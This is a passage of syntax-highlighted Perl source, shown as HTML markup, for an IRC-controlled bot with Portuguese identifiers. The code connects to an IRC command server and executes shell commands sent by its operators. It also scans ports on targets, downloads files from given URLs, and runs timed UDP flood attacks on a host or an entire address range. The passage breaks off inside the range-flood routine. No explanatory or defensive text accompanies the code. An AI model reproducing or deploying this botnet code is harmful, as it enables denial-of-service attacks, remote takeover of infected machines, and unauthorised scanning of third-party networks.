class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> _<span class=\"title\">get</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $url = <span class=\"keyword\">shift</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $proxy = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">grep</span> &#123;(<span class=\"keyword\">lc</span>($_) eq <span class=\"string\">&quot;http_proxy&quot;</span>) &amp;&amp; ($proxy = $ENV&#123;$_&#125;)&#125; <span class=\"keyword\">keys</span> %ENV;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (($proxy eq <span class=\"string\">&quot;&quot;</span>) &amp;&amp; $url =~ m,^http:<span class=\"regexp\">//</span>([^<span class=\"regexp\">/:]+)(?::(\\d+))?(/</span>\\S*)?$,) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $host = $1;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $port = $2 || <span class=\"number\">80</span>;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $path = $3;</span><br><span class=\"line\">    $path = <span class=\"string\">&quot;/&quot;</span> <span class=\"keyword\">unless</span> <span class=\"keyword\">defined</span>($path);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> _trivial_http_get($host, $port, $path);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">elsif</span> ($proxy =~ m,^http:<span class=\"regexp\">//</span>([^<span class=\"regexp\">/:]+):(\\d+)(/</span>\\S*)?$,) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $host = $1;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $port = $2;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $path = $url;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> _trivial_http_get($host, $port, $path);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">undef</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> _<span class=\"title\">trivial_http_get</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span>($host, $port, $path) = @_;</span><br><span class=\"line\">  <span class=\"keyword\">my</span>($AGENT, $VERSION, $p);</span><br><span class=\"line\"></span><br><span class=\"line\">  $AGENT = <span class=\"string\">&quot;get-minimal&quot;</span>;</span><br><span class=\"line\">  $VERSION = <span class=\"string\">&quot;20000118&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  $path =~ <span class=\"regexp\">s/ /%20/g</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">require</span> IO::Socket;</span><br><span class=\"line\">  <span class=\"keyword\">local</span>($^W) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $sock = IO::Socket::INET-&gt;new(<span class=\"string\">PeerAddr =&gt;</span> $host,</span><br><span class=\"line\">                                   <span class=\"string\">PeerPort =&gt;</span> $port,</span><br><span class=\"line\">                                   <span class=\"string\">Proto   =&gt;</span> <span class=\"string\">&#x27;tcp&#x27;</span>,</span><br><span class=\"line\">                                   <span class=\"string\">Timeout  =&gt;</span> <span class=\"number\">60</span>) || <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  $sock-&gt;autoflush;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $netloc = $host;</span><br><span class=\"line\">  $netloc .= <span class=\"string\">&quot;:$port&quot;</span> <span class=\"keyword\">if</span> $port != <span class=\"number\">80</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $request = <span class=\"string\">&quot;GET $path HTTP/1.0\\015\\012&quot;</span></span><br><span class=\"line\">              . <span class=\"string\">&quot;Host: $netloc\\015\\012&quot;</span></span><br><span class=\"line\">              . <span class=\"string\">&quot;User-Agent: $AGENT/$VERSION/u\\015\\012&quot;</span>;</span><br><span class=\"line\">  $request .= <span class=\"string\">&quot;Pragma: no-cache\\015\\012&quot;</span> <span class=\"keyword\">if</span> ($main::http_no_cache);</span><br><span class=\"line\">  $request .= <span class=\"string\">&quot;\\015\\012&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">print</span> $sock $request;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">my</span> $buf = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $n;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $b1 = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ($n = <span class=\"keyword\">sysread</span>($sock, $buf, <span class=\"number\">8</span>*<span class=\"number\">1024</span>, <span class=\"keyword\">length</span>($buf))) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($b1 eq <span class=\"string\">&quot;&quot;</span>) &#123; </span><br><span class=\"line\">      $b1 = $buf;         </span><br><span class=\"line\">      $buf =~ <span class=\"regexp\">s/.+?\\015?\\012\\015?\\012//s</span>;      </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($http_stream_out) &#123; <span class=\"keyword\">print</span> GET_OUTFILE $buf; $buf = <span class=\"string\">&quot;&quot;</span>; &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">undef</span> <span class=\"keyword\">unless</span> <span class=\"keyword\">defined</span>($n);</span><br><span class=\"line\"></span><br><span class=\"line\">  $main::http_get_result = <span class=\"number\">200</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ($b1 =~ m,^HTTP/\\d+\\.\\d+\\s+(\\d+)[^\\<span class=\"number\">012</span>]*\\<span class=\"number\">012</span>,) &#123;</span><br><span class=\"line\">    $main::http_get_result = $1;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($main::http_get_result =~ <span class=\"regexp\">/^30[1237]/</span> &amp;&amp; $b1 =~ <span class=\"regexp\">/\\012Location:\\s*(\\S+)/</span></span><br><span class=\"line\">) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">my</span> $url = $1;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"keyword\">undef</span> <span class=\"keyword\">if</span> $http_loop_check&#123;$url&#125;++;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> _get($url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">undef</span> <span class=\"keyword\">unless</span> $main::http_get_result =~ <span class=\"regexp\">/^2/</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> $buf;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$sel_cliente = IO::Select-&gt;new();</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">sendraw</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ($#_ == <span class=\"string\">&#x27;1&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $socket = $_[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"keyword\">print</span> $socket <span class=\"string\">&quot;$_[1]\\n&quot;</span>;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">print</span> $IRC_cur_socket <span class=\"string\">&quot;$_[0]\\n&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">conectar</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">my</span> $meunick = $_[<span class=\"number\">0</span>];</span><br><span class=\"line\">   <span class=\"keyword\">my</span> $servidor_con = $_[<span class=\"number\">1</span>];</span><br><span class=\"line\">   <span class=\"keyword\">my</span> $porta_con = $_[<span class=\"number\">2</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">my</span> $IRC_socket = IO::Socket::INET-&gt;new(<span class=\"string\">Proto=&gt;</span><span class=\"string\">&quot;tcp&quot;</span>, <span class=\"string\">PeerAddr=&gt;</span><span class=\"string\">&quot;$servidor_con&quot;</span>, <span class=\"string\">PeerPort=&gt;$porta_con</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">return</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (<span class=\"keyword\">defined</span>($IRC_socket)) &#123;</span><br><span class=\"line\">     $IRC_cur_socket = $IRC_socket;</span><br><span class=\"line\"></span><br><span class=\"line\">     $IRC_socket-&gt;autoflush(<span class=\"number\">1</span>);</span><br><span class=\"line\">     $sel_cliente-&gt;add($IRC_socket);</span><br><span class=\"line\"></span><br><span class=\"line\">     $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;host&#x27;</span>&#125; = <span class=\"string\">&quot;$servidor_con&quot;</span>;</span><br><span class=\"line\">     $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;porta&#x27;</span>&#125; = <span class=\"string\">&quot;$porta_con&quot;</span>;</span><br><span class=\"line\">     $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;nick&#x27;</span>&#125; = $meunick;</span><br><span class=\"line\">     $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;meuip&#x27;</span>&#125; = $IRC_socket-&gt;sockhost;</span><br><span class=\"line\">     nick(<span class=\"string\">&quot;$meunick&quot;</span>);</span><br><span class=\"line\">     sendraw(<span class=\"string\">&quot;USER $ircname &quot;</span>.$IRC_socket-&gt;sockhost.<span class=\"string\">&quot; $servidor_con :$realname&quot;</span>);</span><br><span class=\"line\">     <span class=\"keyword\">sleep</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $line_temp;</span><br><span class=\"line\"><span class=\"keyword\">while</span>( <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">   <span class=\"keyword\">while</span> (!(<span class=\"keyword\">keys</span>(%irc_servers))) &#123; conectar(<span class=\"string\">&quot;$nick&quot;</span>, <span class=\"string\">&quot;$servidor&quot;</span>, <span class=\"string\">&quot;$porta&quot;</span>); &#125;</span><br><span class=\"line\">   <span class=\"keyword\">delete</span>($irc_servers&#123;<span class=\"string\">&#x27;&#x27;</span>&#125;) <span class=\"keyword\">if</span> (<span class=\"keyword\">defined</span>($irc_servers&#123;<span class=\"string\">&#x27;&#x27;</span>&#125;));</span><br><span class=\"line\">   &amp;DCC::connections;</span><br><span class=\"line\">   <span class=\"keyword\">my</span> @ready = $sel_cliente-&gt;can_read(<span class=\"number\">0</span>.<span class=\"number\">6</span>);</span><br><span class=\"line\">   <span class=\"keyword\">next</span> <span class=\"keyword\">unless</span>(@ready);</span><br><span class=\"line\">   <span class=\"keyword\">foreach</span> $fh (@ready) &#123;</span><br><span class=\"line\">     $IRC_cur_socket = $fh;</span><br><span class=\"line\">     $meunick = $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;nick&#x27;</span>&#125;;</span><br><span class=\"line\">     $nread = <span class=\"keyword\">sysread</span>($fh, $msg, <span class=\"number\">4096</span>);</span><br><span class=\"line\">     <span class=\"keyword\">if</span> ($nread == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        $sel_cliente-&gt;remove($fh);</span><br><span class=\"line\">        $fh-&gt;<span class=\"keyword\">close</span>;</span><br><span class=\"line\">        <span class=\"keyword\">delete</span>($irc_servers&#123;$fh&#125;);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     @lines = <span class=\"keyword\">split</span> (<span class=\"regexp\">/\\n/</span>, $msg);</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">for</span>(<span class=\"keyword\">my</span> $c=<span class=\"number\">0</span>; $c&lt;= $#lines; $c++) &#123;</span><br><span class=\"line\">       $line = $lines[$c];</span><br><span class=\"line\">       $line=$line_temp.$line <span class=\"keyword\">if</span> ($line_temp);</span><br><span class=\"line\">       $line_temp=<span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">       $line =~ <span class=\"regexp\">s/\\r$//</span>;</span><br><span class=\"line\">       <span class=\"keyword\">unless</span> ($c == $#lines) &#123;</span><br><span class=\"line\">         parse(<span class=\"string\">&quot;$line&quot;</span>);</span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">           <span class=\"keyword\">if</span> ($#lines == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">             parse(<span class=\"string\">&quot;$line&quot;</span>);</span><br><span class=\"line\">           &#125; <span class=\"keyword\">elsif</span> ($lines[$c] =~ <span class=\"regexp\">/\\r$/</span>) &#123;</span><br><span class=\"line\">               parse(<span class=\"string\">&quot;$line&quot;</span>);</span><br><span class=\"line\">           &#125; <span class=\"keyword\">elsif</span> ($line =~ <span class=\"regexp\">/^(\\S+) NOTICE AUTH :\\*\\*\\*/</span>) &#123;</span><br><span class=\"line\">               parse(<span class=\"string\">&quot;$line&quot;</span>);</span><br><span class=\"line\">           &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">               $line_temp = $line;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">parse</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">my</span> $servarg = <span class=\"keyword\">shift</span>;</span><br><span class=\"line\">   <span class=\"keyword\">if</span> ($servarg =~ <span class=\"regexp\">/^PING \\:(.*)/</span>) &#123;</span><br><span class=\"line\">     sendraw(<span class=\"string\">&quot;PONG :$1&quot;</span>);</span><br><span class=\"line\">   &#125; <span class=\"keyword\">elsif</span> ($servarg =~ <span class=\"regexp\">/^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/</span>) &#123;</span><br><span class=\"line\">       <span class=\"keyword\">my</span> $pn=$1; <span class=\"keyword\">my</span> $onde = $4; <span class=\"keyword\">my</span> $args = $5;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> ($args =~ <span class=\"regexp\">/^\\001VERSION\\001$/</span>) &#123;</span><br><span class=\"line\">         notice(<span class=\"string\">&quot;$pn&quot;</span>, <span class=\"string\">&quot;\\001VERSION mIRC v6.16 ENE ALIN GABRIEL\\001&quot;</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"keyword\">elsif</span> ($args =~ <span class=\"regexp\">/^\\001PING\\s+(\\d+)\\001$/</span>) &#123;</span><br><span class=\"line\">         notice(<span class=\"string\">&quot;$pn&quot;</span>, <span class=\"string\">&quot;\\001PONG\\001&quot;</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"keyword\">elsif</span> (<span class=\"keyword\">grep</span> &#123;$_ =~ <span class=\"regexp\">/^\\Q$pn\\E$/i</span> &#125; @adms) &#123;</span><br><span class=\"line\">         <span class=\"keyword\">if</span> ($onde eq <span class=\"string\">&quot;$meunick&quot;</span>)&#123;</span><br><span class=\"line\">           shell(<span class=\"string\">&quot;$pn&quot;</span>, <span class=\"string\">&quot;$args&quot;</span>);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">         <span class=\"keyword\">elsif</span> ($args =~ <span class=\"regexp\">/^(\\Q$meunick\\E|\\Q$prefixo\\E)\\s+(.*)/</span> ) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">my</span> $natrix = $1;</span><br><span class=\"line\">            <span class=\"keyword\">my</span> $arg = $2;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ($arg =~ <span class=\"regexp\">/^\\!(.*)/</span>) &#123;</span><br><span class=\"line\">              ircase(<span class=\"string\">&quot;$pn&quot;</span>,<span class=\"string\">&quot;$onde&quot;</span>,<span class=\"string\">&quot;$1&quot;</span>) <span class=\"keyword\">unless</span> ($natrix eq <span class=\"string\">&quot;$prefixo&quot;</span> <span class=\"keyword\">and</span> $arg =~ <span class=\"regexp\">/^\\!nick/</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">elsif</span> ($arg =~ <span class=\"regexp\">/^\\@(.*)/</span>) &#123;</span><br><span class=\"line\">                $ondep = $onde;</span><br><span class=\"line\">                $ondep = $pn <span class=\"keyword\">if</span> $onde eq $meunick;</span><br><span class=\"line\">                bfunc(<span class=\"string\">&quot;$ondep&quot;</span>,<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                shell(<span class=\"string\">&quot;$onde&quot;</span>, <span class=\"string\">&quot;$arg&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125; <span class=\"keyword\">elsif</span> ($servarg =~ <span class=\"regexp\">/^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i</span>) &#123;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (<span class=\"keyword\">lc</span>($1) eq <span class=\"keyword\">lc</span>($meunick)) &#123;</span><br><span class=\"line\">         $meunick=$4;</span><br><span class=\"line\">         $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;nick&#x27;</span>&#125; = $meunick;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125; <span class=\"keyword\">elsif</span> ($servarg =~ <span class=\"regexp\">m/^\\:(.+?)\\s+433/i</span>) &#123;</span><br><span class=\"line\">       $meunick = getnick();</span><br><span class=\"line\">       nick(<span class=\"string\">&quot;$meunick&quot;</span>);</span><br><span class=\"line\">   &#125; <span class=\"keyword\">elsif</span> ($servarg =~ <span class=\"regexp\">m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i</span>) &#123;</span><br><span class=\"line\">       $meunick = $2;</span><br><span class=\"line\">       $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;nick&#x27;</span>&#125; = $meunick;</span><br><span class=\"line\">       $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;nome&#x27;</span>&#125; = <span class=\"string\">&quot;$1&quot;</span>;</span><br><span class=\"line\">       <span class=\"keyword\">foreach</span> <span class=\"keyword\">my</span> $canal (@canais) &#123;</span><br><span class=\"line\">         sendraw(<span class=\"string\">&quot;JOIN $canal&quot;</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">bfunc</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $printl = $_[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $funcarg = $_[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">my</span> $pid = <span class=\"keyword\">fork</span>) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">waitpid</span>($pid, <span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">fork</span>) &#123;</span><br><span class=\"line\">         <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">           <span class=\"keyword\">if</span> ($funcarg =~ <span class=\"regexp\">/^portscan (.*)/</span>) &#123;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> $hostip=<span class=\"string\">&quot;$1&quot;</span>;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> @portas=(<span class=\"string\">&quot;21&quot;</span>,<span class=\"string\">&quot;22&quot;</span>,<span class=\"string\">&quot;23&quot;</span>,<span class=\"string\">&quot;25&quot;</span>,<span class=\"string\">&quot;53&quot;</span>,<span class=\"string\">&quot;80&quot;</span>,<span class=\"string\">&quot;110&quot;</span>,<span class=\"string\">&quot;143&quot;</span>,<span class=\"string\">&quot;6665&quot;</span>);</span><br><span class=\"line\">             <span class=\"keyword\">my</span> (@aberta, %porta_banner);</span><br><span class=\"line\">             <span class=\"keyword\">foreach</span> <span class=\"keyword\">my</span> $porta (@portas)  &#123;</span><br><span class=\"line\">                <span class=\"keyword\">my</span> $scansock = IO::Socket::INET-&gt;new(<span class=\"string\">PeerAddr =&gt;</span> $hostip, <span class=\"string\">PeerPort =&gt;</span> $porta, <span class=\"string\">Proto =&gt;</span> <span class=\"string\">&#x27;tcp&#x27;</span>, <span class=\"string\">Timeout =&gt;</span> <span class=\"number\">4</span>);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ($scansock) &#123;</span><br><span class=\"line\">                   <span class=\"keyword\">push</span> (@aberta, $porta);</span><br><span class=\"line\">                   $scansock-&gt;<span class=\"keyword\">close</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">             <span class=\"keyword\">if</span> (@aberta) &#123;</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :Portas abertas: @aberta&quot;</span>);</span><br><span class=\"line\">             &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                 sendraw($IRC_cur_socket,<span class=\"string\">&quot;PRIVMSG $printl :Nenhuma porta aberta foi encontrada.&quot;</span>);</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"keyword\">elsif</span> ($funcarg =~ <span class=\"regexp\">/^download\\s+(.*)\\s+(.*)/</span>) &#123;</span><br><span class=\"line\">            getstore(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>);</span><br><span class=\"line\">            sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :Download de $2 ($1) Conclu.do!&quot;</span>) <span class=\"keyword\">if</span> ($estatisticas);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"keyword\">elsif</span> ($funcarg =~ <span class=\"regexp\">/^fullportscan\\s+(.*)\\s+(\\d+)\\s+(\\d+)/</span>) &#123;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> $hostname=<span class=\"string\">&quot;$1&quot;</span>;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> $portainicial = <span class=\"string\">&quot;$2&quot;</span>;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> $portafinal = <span class=\"string\">&quot;$3&quot;</span>;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> (@abertas, %porta_banner);</span><br><span class=\"line\">             <span class=\"keyword\">foreach</span> <span class=\"keyword\">my</span> $porta ($portainicial..$portafinal)</span><br><span class=\"line\">             &#123;</span><br><span class=\"line\">               <span class=\"keyword\">my</span> $scansock = IO::Socket::INET-&gt;new(<span class=\"string\">PeerAddr =&gt;</span> $hostname, <span class=\"string\">PeerPort =&gt;</span> $porta, <span class=\"string\">Proto =&gt;</span> <span class=\"string\">&#x27;tcp&#x27;</span>, <span class=\"string\">Timeout =&gt;</span> <span class=\"number\">4</span>);</span><br><span class=\"line\">               <span class=\"keyword\">if</span> ($scansock) &#123;</span><br><span class=\"line\">                 <span class=\"keyword\">push</span> (@abertas, $porta);</span><br><span class=\"line\">                 $scansock-&gt;<span class=\"keyword\">close</span>;</span><br><span class=\"line\">                 <span class=\"keyword\">if</span> ($estatisticas) &#123;</span><br><span class=\"line\">                   sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :Porta $porta aberta em $hostname&quot;</span>);</span><br><span class=\"line\">                 &#125;</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">             <span class=\"keyword\">if</span> (@abertas) &#123;</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :Portas abertas: @abertas&quot;</span>);</span><br><span class=\"line\">             &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">               sendraw($IRC_cur_socket,<span class=\"string\">&quot;PRIVMSG $printl :Nenhuma porta aberta foi encontrada.&quot;</span>);</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elsif</span> ($funcarg =~ <span class=\"regexp\">/^udp\\s+(.*)\\s+(\\d+)\\s+(\\d+)/</span>) &#123;</span><br><span class=\"line\">              <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $pacotes;</span><br><span class=\"line\">              <span class=\"keyword\">socket</span>(Tr0x, PF_INET, SOCK_DGRAM, <span class=\"number\">17</span>);</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $alvo=inet_aton(<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $porta = <span class=\"string\">&quot;$2&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $tempo = <span class=\"string\">&quot;$3&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $pacote;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $pacotese;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $fim = <span class=\"keyword\">time</span> + $tempo;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $pacota = <span class=\"number\">1</span>;</span><br><span class=\"line\">              <span class=\"keyword\">while</span> (($pacota == <span class=\"string\">&quot;1&quot;</span>) &amp;&amp; ($pacotes == <span class=\"string\">&quot;1&quot;</span>)) &#123;</span><br><span class=\"line\">                $pacota = <span class=\"number\">0</span> <span class=\"keyword\">if</span> ((<span class=\"keyword\">time</span> &gt;= $fim) &amp;&amp; ($tempo != <span class=\"string\">&quot;0&quot;</span>));</span><br><span class=\"line\">                $pacote=$rand <span class=\"keyword\">x</span> $rand <span class=\"keyword\">x</span> $rand;</span><br><span class=\"line\">                $porta = <span class=\"keyword\">int</span>(<span class=\"keyword\">rand</span> <span class=\"number\">65000</span>) +<span class=\"number\">1</span> <span class=\"keyword\">if</span> ($porta == <span class=\"string\">&quot;0&quot;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">send</span>(Tr0x, <span class=\"number\">0</span>, $pacote, sockaddr_in($porta, $alvo)) <span class=\"keyword\">and</span> $pacotese++ <span class=\"keyword\">if</span> ($pacotes == <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> ($estatisticas)</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Tempo de Pacotes\\002: $tempo&quot;</span>.<span class=\"string\">&quot;s&quot;</span>);</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Total de Pacotes\\002: $pacotese&quot;</span>);</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Alvo dos Pacotes\\002: $1&quot;</span>);</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elsif</span> ($funcarg =~ <span class=\"regexp\">/^udpfaixa\\s+(.*)\\s+(\\d+)\\s+(\\d+)/</span>) &#123;</span><br><span class=\"line\">              <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $pacotes;</span><br><span class=\"line\">              <span class=\"keyword\">socket</span>(Tr0x, PF_INET, SOCK_DGRAM, <span class=\"number\">17</span>);</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $faixaip=<span class=\"string\">&quot;$1&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $porta = <span class=\"string\">&quot;$2&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $tempo = <span class=\"string\">&quot;$3&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $pacote;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $pacotes;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $fim = <span class=\"keyword\">time</span> + $tempo;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $pacota = <span class=\"number\">1</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $alvo;</span><br><span class=\"line\">              <span class=\"keyword\">while</span> ($pacota == <span class=\"string\">&quot;1&quot;</span>) &#123;</span><br><span class=\"line\">                $pacota = <span class=\"number\">0</span> <span class=\"keyword\">if</span> ((<span class=\"keyword\">time</span> &gt;= $fim) &amp;&amp; ($tempo != <span class=\"string\">&quot;0&quot;</span>));</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"keyword\">my</span> $faixa = <span class=\"number\">1</span>; $faixa &lt;= <span class=\"number\">255</span>; $faixa++) &#123;</span><br><span class=\"line\">                  $alvo = 